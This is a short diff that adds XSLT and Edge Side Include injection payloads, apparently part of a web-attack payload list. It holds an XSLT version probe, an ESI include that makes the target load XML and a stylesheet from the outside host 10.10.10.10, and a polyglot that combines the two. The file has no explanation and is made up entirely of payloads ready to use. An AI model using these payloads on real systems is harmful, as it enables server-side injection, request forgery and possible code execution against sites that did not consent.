@@ -1,0 +1,5 @@
+<xsl:value-of select="system-property('xsl:version')" />
+<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
+
+Polyglot
+<xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
